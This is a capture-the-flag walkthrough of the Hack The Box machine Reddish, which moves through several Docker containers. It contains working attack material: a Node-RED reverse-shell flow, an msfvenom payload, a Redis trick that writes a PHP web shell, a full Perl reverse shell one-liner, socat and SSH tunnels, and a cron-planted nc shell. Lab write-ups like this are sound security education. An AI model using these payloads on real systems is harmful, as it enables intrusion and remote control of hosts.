This post documents the complete walkthrough of Reddish, a retired vulnerable [VM][1] created by [yuntao][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

Reddish is a retired vulnerable VM from Hack The Box.

### Information Gathering

Letâ€™s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 10.10.10.94
...
PORT     STATE SERVICE REASON         VERSION
1880/tcp open  http    syn-ack ttl 62 Node.js Express framework

```

</a>

Since I can't `GET`, let's try `POST`.

### Node-RED

<a class="image-popup">
![34217a09.png](/assets/images/posts/reddish-htb-walkthrough/34217a09.png)
</a>

Nice! Let's follow the hint from the output above.

<a class="image-popup">
![b4cac579.png](/assets/images/posts/reddish-htb-walkthrough/b4cac579.png)
</a>

Node-RED allows command execution. Import the following flow into the Node-RED and you should see something like this.

```json
[{"id":"30fa9bc2.3414cc","type":"tcp in","z":"506564e3.6cef04","name":"","server":"client","host":"10.10.13.52","port":"1234","datamode":"stream","datatype":"buffer","newline":"","topic":"","base64":false,"x":120,"y":80,"wires":[["cc2b2fad.f52d6"]]},{"id":"4f71ce1a.fc7078","type":"tcp out","z":"506564e3.6cef04","host":"","port":"","beserver":"reply","base64":false,"end":false,"name":"","x":650,"y":80,"wires":[]},{"id":"cc2b2fad.f52d6","type":"exec","z":"506564e3.6cef04","command":"/bin/bash -c","addpay":true,"append":"","useSpawn":"false","timer":"","oldrc":false,"name":"","x":410,"y":160,"wires":[["4f71ce1a.fc7078"],["4f71ce1a.fc7078"],[]]}]
```

<a class="image-popup">

</a>

Here, I'm running a reverse shell flow, executing `/bin/bash -c` and returning `stdout` and `stderr` to myself. And, because it's running under the context of `/bin/bash -c`, commands with space has to be enclosed in quotes.

Bummer, I know.

That's why I spun off another reverse shell with `msfvenom`.

```
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.13.52 LPORT=9999 -f elf -o rev
```

Next, I've to find a more efficient way of transferring files over to the remote target. To that end, I wrote a `wget` utility in Node.js since `node` and the `request` modules are available. The script has two arguments: the first argument is the download URL and the second argument is the path to save the file.

<div class="filename"><span>wget.js</span></div>

```js
const fs = require('fs');
const request = require('request');

var args = process.argv.slice(2);
var url = args[0];
var location = args[1];

request(url).pipe(fs.createWriteStream(location));
```

Long story short, I transferred over the `base64`-encoded string of the `wget.js` and reverse the process like so.

<a class="image-popup">

</a>

Now that I've a better shell and have `root`; only to realize that Node-RED is running inside a Docker container!

<a class="image-popup">
![dc175e6a.png](/assets/images/posts/reddish-htb-walkthrough/dc175e6a.png)
</a>

Exploring the docker container, I realized that there might be other containers around!

<a class="image-popup">
![15854ce9.png](/assets/images/posts/reddish-htb-walkthrough/15854ce9.png)
</a>

Look at `172.19.0.4/16`. My first guess is that there are probably two containers on `172.19.0.2` and `172.19.0.3` respectively because `172.19.0.1` is likely the host.

And because the docker container is lacking in the network reconnaissance department, I'd to transfer `nc` to act as a no-frills port scanner, leveraging on the zero I/O mode in `nc`.

<a class="image-popup">
![dcb10508.png](/assets/images/posts/reddish-htb-walkthrough/dcb10508.png)
</a>

With `nc`, I can perform rudimentary port scans to my liking.

<a class="image-popup">
![cc3f6db4.png](/assets/images/posts/reddish-htb-walkthrough/cc3f6db4.png)
</a>

<a class="image-popup">
![ce11a9c4.png](/assets/images/posts/reddish-htb-walkthrough/ce11a9c4.png)
</a>

Next, let's transfer over Dropbear SSH client, `dbclient`, a drop-in replacement SSH client with a small footprint. The `dbclient` allows us to forward remote ports to my attacking machine via the SSH tunnel. The instruction to statically compile `dbclient` is beyond the scope of this write-up.

<a class="image-popup">
![5312b252.png](/assets/images/posts/reddish-htb-walkthrough/5312b252.png)
</a>

While we are at it, let's transfer a [statically compiled](https://github.com/andrew-d/static-binaries) `socat` as well. Now, start the SSH server on my attacking machine. Note that I've allowed `root` login with `PermitRootLogin yes`.

```
# systemctl start ssh
```

Forward the remote ports to my attacking machine like so.

```
# ssh -R 10.10.13.52:6379:172.19.0.2:6379 root@10.10.13.52 -f -N
# ssh -R 10.10.13.52:80:172.19.0.3:80 root@10.10.13.52 -f -N
```
<a class="image-popup">
![330408a6.png](/assets/images/posts/reddish-htb-walkthrough/330408a6.png)
</a>

Now, I can access these docker containers!

### Next Container: `www`

<a class="image-popup">
![ca73aed2.png](/assets/images/posts/reddish-htb-walkthrough/ca73aed2.png)
</a>

Looks like we have hints in the HTML source.

<a class="image-popup">
![225874a9.png](/assets/images/posts/reddish-htb-walkthrough/225874a9.png)
</a>

If I have to guess, I would say that the `www` container and the `redis` container are sharing `/var/www/html`. Another piece of technology that will aid us is PHP.

<a class="image-popup">
![8969b34f.png](/assets/images/posts/reddish-htb-walkthrough/8969b34f.png)
</a>

If that's the case, then I can do something like this since I also have access to the `redis` container:

<a class="image-popup">
![8c81ac83.png](/assets/images/posts/reddish-htb-walkthrough/8c81ac83.png)
</a>

1. Set `dir` to `/var/www/html`.
2. Set `dbfilename` to `cmd.php`.
3. Set a key with PHP code to allows remote command execution.
4. Save the snapshot.

<a class="image-popup">
![3f606a3a.png](/assets/images/posts/reddish-htb-walkthrough/3f606a3a.png)
</a>

Awesome. It works!

<a class="image-popup">
![9c96e133.png](/assets/images/posts/reddish-htb-walkthrough/9c96e133.png)
</a>

I prefer to use Perl as the reverse shell because it's always available, even in containers. :grin:

Before we do that, we need to set up another a TCP tunnel between `nodered` and my attacking machine to facilitate data shuffling between the `www` container and my attacking machine.

<a class="image-popup">
![66ad6a7b.png](/assets/images/posts/reddish-htb-walkthrough/66ad6a7b.png)
</a>

This is how the Perl reverse shell looks like before URL encoding:

```
perl -e 'use Socket;$i="172.19.0.4";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

Encode it to prevent complications.

```
perl%20-e%20%27use%20Socket%3B%24i%3D%22172.19.0.4%22%3B%24p%3D4444%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fbash%20-i%22%29%3B%7D%3B%27
```

We have shell into `www`!

<a class="image-popup">
![93b832f1.png](/assets/images/posts/reddish-htb-walkthrough/93b832f1.png)
</a>

### Next Container: `backup`

We'll soon realize that `www` is another multi-homed container.

<a class="image-popup">
![b9c0d8cb.png](/assets/images/posts/reddish-htb-walkthrough/b9c0d8cb.png)
</a>

It's getting familiar now. Another container probably lives at `172.20.0.2`. Suffice to say, we need to transfer our beloved `nc` to `www` to show some port scanning love to the newly discovered container.

The transfer this time round is more troublesome because the reverse shell truncates the `base64`-encoded string of `nc`. Fret not, we can `gzip` before encoding. Like this, we can save some space and reduce the number of times we copy-and-paste the string over in a piece-meal fashion.

<a class="image-popup">
![29c59a41.png](/assets/images/posts/reddish-htb-walkthrough/29c59a41.png)
</a>

It's not pretty but hey, it works!

<a class="image-popup">
![4a2e4309.png](/assets/images/posts/reddish-htb-walkthrough/4a2e4309.png)
</a>

What do we have here?

<a class="image-popup">
![1fc6c192.png](/assets/images/posts/reddish-htb-walkthrough/1fc6c192.png)
</a>

And there's a `rysnc` client in `www`!

<a class="image-popup">
![caec74a8.png](/assets/images/posts/reddish-htb-walkthrough/caec74a8.png)
</a>

During enumeration of `www`, I found the following locations of interest:

+ `cron` job at `/etc/cron.d/backup`
+ `/dev/sda3` `mount`ed at `/home`

<a class="image-popup">
![0f201a94.png](/assets/images/posts/reddish-htb-walkthrough/0f201a94.png)
</a>

This is how `backup.sh` looks like.

<a class="image-popup">
![82a69a18.png](/assets/images/posts/reddish-htb-walkthrough/82a69a18.png)
</a>

This is how the `mount`s looks like.

<a class="image-popup">
![81db80f4.png](/assets/images/posts/reddish-htb-walkthrough/81db80f4.png)
</a>

Now I'm pretty sure getting the flags have something to do with the last container.

I'll not go over how to use or what `rsync` is, that's what the man-pages are for. RTFM!

<a class="image-popup">
![4c13e0f5.png](/assets/images/posts/reddish-htb-walkthrough/4c13e0f5.png)
</a>

Pivoting on how `cron` job is scheduled in `www`, I found a similar `cron` job in `backup` too.

<a class="image-popup">
![5eb2d293.png](/assets/images/posts/reddish-htb-walkthrough/5eb2d293.png)
</a>

No wonder the database backup doesn't complete!

We know `rsync` works both ways. We can copy files from `backup`, we can also copy files over to `backup`. I've done my enumerations. :triumph:

Let's copy two files over. Our beloved `nc` and another `cron` job that runs the `nc` reverse shell back to us. But before we do that, we need to set up a pair of TCP tunnels between `nodered` and `www`; and `nodered` and my attacking machine. If you have been following the walkthrough so far, you realized that there's no `socat` in `www`. As such, we also need to transfer `socat` to `www`, with the help of `nc`, of course.

_On `www`, use the following command_

```
$ /tmp/nc -lnvp 1234 > /tmp/socat &
```

_On `nodered`, use the following command_

```
# nc 172.19.0.3 1234 < /usr/bin/socat &
```

Now we cat set up the tunnels.

_On `www`, use the following command_

```
$ /tmp/socat tcp-listen:5555,fork tcp:172.20.0.3:5555 &
```

_On `nodered`, use the following command_

```
# socat tcp-listen:5555,fork tcp:10.10.13.52:5555 &
```

Now, let's copy the files over.

<a class="image-popup">
![9ca34772.png](/assets/images/posts/reddish-htb-walkthrough/9ca34772.png)
</a>

A minute later, you'll receive a `root` shell on `backup`.

<a class="image-popup">
![1c0006c2.png](/assets/images/posts/reddish-htb-walkthrough/1c0006c2.png)
</a>

### Flags

The `backup` container as the name suggests, stores the data on the host. Because of that, we can `mount` the host's partitions within the container. And since we are `root` on this container, we can read any files from the `mount`ed volumes.
